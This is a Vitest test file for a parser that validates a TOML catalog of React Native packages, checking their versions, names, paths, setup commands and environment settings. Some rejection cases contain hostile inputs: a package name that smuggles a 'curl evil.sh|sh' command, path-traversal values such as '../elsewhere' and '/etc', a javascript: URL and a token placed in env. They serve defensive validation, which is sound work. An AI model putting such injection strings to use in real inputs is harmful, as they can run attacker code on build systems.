import { readdirSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { parseCatalog, parseCatalogText, readCatalog, RESERVED_NAMES, tagFor } from './catalog.mjs';
import { REPO_ROOT } from './config.mjs';

const FILE = 'green-packages.toml';
const settings = {
  source: { tag: 'v{version}', dir: '.' },
  setup: { install: ['.'] },
  test: { dir: '.', run: ['yarn', 'test'] },
  demo: { dir: 'example' },
};
const pkg = (overrides = {}) => ({
  name: 'example',
  repository: 'https://github.com/example/example',
  versions: ['2.1.3', '2.0.0'],
  ...settings,
  ...overrides,
});
const doc = (packages = [pkg()], reactNative = { versions: ['0.88.0-rc.3', '0.87.1'] }) => ({ schema: 1, 'react-native': reactNative, package: packages });
const errorsOf = (raw) => {
  const result = parseCatalog(raw, FILE);
  return result.ok ? [] : result.errors;
};
const without = (object, ...keys) => Object.fromEntries(Object.entries(object).filter(([k]) => !keys.includes(k)));

describe('parseCatalog', () => {
  it('returns React Native ascending with channels, packages by name, lines newest first', () => {
    const result = parseCatalog(doc([pkg({ name: 'zeta' }), pkg({ name: '@scope/alpha', versions: ['1.9.0', '1.10.2'] })]), FILE);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.value.reactNative).toEqual([
      { line: '0.87', version: '0.87.1', channel: 'stable' },
      { line: '0.88', version: '0.88.0-rc.3', channel: 'rc' },
    ]);
    expect(result.value.packages.map((p) => p.name)).toEqual(['@scope/alpha', 'zeta']);
    expect(result.value.packages[0].lines).toEqual([
      { line: '1.10', version: '1.10.2' },
      { line: '1.9', version: '1.9.0' },
    ]);
  });

  it('turns the settings tables into the settings the check scripts use, with defaults', () => {
    const minimal = pkg({ source: undefined, setup: undefined });
    const result = parseCatalog(doc([JSON.parse(JSON.stringify(minimal))]), FILE);
    expect(result.ok && result.value.packages[0]).toEqual({
      name: 'example',
      repository: 'https://github.com/example/example',
      enabled: true,
      lines: [{ line: '2.1', version: '2.1.3' }, { line: '2.0', version: '2.0.0' }],
      settings: { tag: 'v{version}', packageDir: '.', demoApp: 'example', installs: ['.'], prepare: [], test: { dir: '.', run: ['yarn', 'test'] }, env: {} },
    });
  });

  it('accepts every setting the surveyed packages need', () => {
    const reanimated = pkg({
      source: { tag: '{version}', dir: 'packages/react-native-reanimated' },
      setup: { node: '24', install: ['.'], prepare: [{ dir: 'packages/react-native-reanimated', run: ['yarn', 'build'] }], env: { RNS_GAMMA_ENABLED: '1' } },
      test: { dir: 'packages/react-native-reanimated', run: ['yarn', 'test'] },
      demo: { dir: 'apps/fabric-example', 'ios-scheme': 'Debug FabricExample' },
    });
    expect(errorsOf(doc([reanimated]))).toEqual([]);
    const settingsOf = parseCatalog(doc([reanimated]), FILE);
    expect(settingsOf.ok && settingsOf.value.packages[0].settings).toMatchObject({ ios: { scheme: 'Debug FabricExample' }, node: '24' });
    expect(errorsOf(doc([pkg({ source: { tag: '@react-navigation/core@{version}' } })]))).toEqual([]);
  });

  it('lists a package without settings and never checks it', () => {
    const bare = without(pkg(), 'source', 'setup', 'test', 'demo');
    const result = parseCatalog(doc([bare]), FILE);
    expect(result.ok && result.value.packages[0].settings).toBeNull();
    expect(result.ok && result.value.packages[0].enabled).toBe(true);
    const disabled = parseCatalog(doc([pkg({ enabled: false })]), FILE);
    expect(disabled.ok && disabled.value.packages[0].enabled).toBe(false);
  });

  it('requires test and demo once a package has any settings', () => {
    expect(errorsOf(doc([without(pkg(), 'test')]))).toEqual([`${FILE}: package["example"].test: is required with settings: run = [<command>...] with a dir, or run = "none"`]);
    expect(errorsOf(doc([without(pkg(), 'demo', 'test', 'setup')]))).toHaveLength(2);
    expect(errorsOf(doc([pkg({ test: { run: 'none' } })]))).toEqual([]);
    expect(errorsOf(doc([pkg({ test: { run: 'none', dir: '.' } })]))).toEqual([`${FILE}: package["example"].test.dir: is not allowed with run = "none"`]);
    expect(errorsOf(doc([pkg({ test: { run: ['yarn', 'test'] } })]))).toEqual([`${FILE}: package["example"].test.dir: is required with a test command`]);
    expect(errorsOf(doc([pkg({ test: { dir: '.', run: 'yarn test' } })]))).toHaveLength(1);
  });

  it('checks versions: exact, capped, one per minor line, not empty', () => {
    expect(errorsOf(doc([pkg({ versions: ['2.1.3', '2.1.2'] })]))).toEqual([
      `${FILE}: package["example"].versions[1]: "2.1.2" is on line 2.1, which already has "2.1.3": list one version per line`,
    ]);
    for (const bad of [[], ['2.1'], ['^2.1.3'], [`1.0.0-${'a'.repeat(59)}`], [2]]) {
      expect(errorsOf(doc([pkg({ versions: bad })])).length, JSON.stringify(bad)).toBeGreaterThan(0);
    }
    expect(errorsOf(doc([pkg()], { versions: ['0.87.1', '0.87.0'] }))).toHaveLength(1);
    expect(errorsOf(doc([pkg()], { versions: [] }))).toHaveLength(1);
  });

  it('checks names: npm rules, unique, not reserved', () => {
    for (const name of ['x;curl evil.sh|sh;#', 'Upper', '-rf', 'a b', 'x'.repeat(215)]) {
      expect(errorsOf(doc([pkg({ name })])).length, name).toBeGreaterThan(0);
    }
    for (const name of RESERVED_NAMES) expect(errorsOf(doc([pkg({ name })]))[0]).toMatch(/taken by a page or file/);
    expect(errorsOf(doc([pkg(), pkg()]))).toEqual([`${FILE}: package["example"].name: "example" is listed twice`]);
  });

  it('keeps every path inside the repository', () => {
    for (const path of ['../elsewhere', '/etc', 'a/../../b', 'a//b', '', 'a\\b']) {
      expect(errorsOf(doc([pkg({ demo: { dir: path } })])).length, path).toBeGreaterThan(0);
      expect(errorsOf(doc([pkg({ test: { dir: path, run: ['yarn'] } })])).length, path).toBeGreaterThan(0);
      expect(errorsOf(doc([pkg({ setup: { install: [path] } })])).length, path).toBeGreaterThan(0);
    }
    expect(errorsOf(doc([pkg({ demo: { dir: '.' } })]))).toHaveLength(1);
  });

  it('rejects unknown keys at every level, bad commands, bad tags and credentials in env', () => {
    expect(errorsOf({ ...doc(), extra: 1 })).toEqual([`${FILE}: extra: is not a known field`]);
    expect(errorsOf(doc([pkg()], { versions: ['0.87.1'], channel: 'rc' }))).toEqual([`${FILE}: ["react-native"].channel: is not a known field`]);
    expect(errorsOf(doc([pkg({ testCommand: 'jest' })]))).toEqual([`${FILE}: package["example"].testCommand: is not a known field`]);
    expect(errorsOf(doc([pkg({ demo: { dir: 'example', scheme: 'X' } })]))).toEqual([`${FILE}: package["example"].demo.scheme: is not a known field`]);
    expect(errorsOf(doc([pkg({ setup: { prepare: [{ dir: '.', run: [] }] } })]))).toHaveLength(1);
    expect(errorsOf(doc([pkg({ setup: { prepare: [{ dir: '.', run: ['yarn'], shell: true }] } })]))).toHaveLength(1);
    expect(errorsOf(doc([pkg({ setup: { env: { GITHUB_TOKEN: 'x' } } })]))).toHaveLength(1);
    expect(errorsOf(doc([pkg({ setup: { env: { lower: 'x' } } })]))).toHaveLength(1);
    expect(errorsOf(doc([pkg({ setup: { node: 'latest' } })]))).toHaveLength(1);
    for (const tag of ['release', '{name}@{version}', 'v{version}{x}', 'v {version}']) {
      expect(errorsOf(doc([pkg({ source: { tag } })])).length, tag).toBe(1);
    }
    expect(errorsOf(doc([pkg({ repository: 'http://github.com/example/example' })]))).toHaveLength(1);
    expect(errorsOf(doc([pkg({ repository: 'javascript:alert(1)' })]))).toHaveLength(1);
    expect(errorsOf(doc([pkg({ enabled: 'no' })]))).toHaveLength(1);
    expect(errorsOf({ ...doc(), schema: 2 })).toEqual([`${FILE}: schema: must be 1`]);
    expect(errorsOf(doc([]))).toEqual([`${FILE}: package: must list one or more [[package]] entries`]);
  });
});

describe('parseCatalogText', () => {
  it('reports a TOML syntax error with the file and line', () => {
    const result = parseCatalogText('schema = 1\n[react-native]\nversions = ["0.87.1"\n');
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.errors[0]).toMatch(/^green-packages\.toml:\d+:\d+: /);
  });
});

describe('tagFor', () => {
  it('fills in the version', () => {
    expect(tagFor({ tag: 'v{version}' }, '7.5.0')).toBe('v7.5.0');
    expect(tagFor({ tag: '@react-navigation/stack@{version}' }, '7.11.2')).toBe('@react-navigation/stack@7.11.2');
  });
});

describe('the catalog in the repository', () => {
  it('is valid', () => {
    const result = readCatalog(REPO_ROOT);
    expect(result.ok ? [] : result.errors).toEqual([]);
  });

  it('reserves every top-level output of the site', () => {
    // What the build writes at the top level: each file in public/, and each page in src/pages/
    // as "<page>.html" (index.astro becomes index.html) or its folder name.
    const outputs = [
      ...readdirSync(`${REPO_ROOT}/public`),
      ...readdirSync(`${REPO_ROOT}/src/pages`, { withFileTypes: true })
        .filter((entry) => !entry.name.startsWith('['))
        .map((entry) => (entry.isDirectory() ? entry.name : entry.name.replace(/\.astro$/, '.html'))),
    ];
    for (const output of outputs) expect(RESERVED_NAMES).toContain(output);
  });
});
